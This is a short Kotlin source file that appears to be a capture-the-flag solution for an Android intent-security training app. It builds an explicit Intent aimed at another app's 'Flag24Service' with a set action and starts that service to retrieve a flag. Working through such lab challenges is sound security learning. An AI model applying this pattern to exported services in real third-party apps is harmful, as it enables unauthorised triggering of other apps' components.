package com.pachinko.intentattacksurface.utils

import android.content.Context
import android.content.Intent
import android.util.Log

object Flag24 {
    fun getFlag(context: Context) {
        val intent = Intent().apply {
            setClassName(
                "io.hextree.attacksurface",
                "io.hextree.attacksurface.services.Flag24Service"
            )
            action = "io.hextree.services.START_FLAG24_SERVICE"
        }
        Log.d("Flag24", "Starting service")
        context.startService(intent)
    }
}
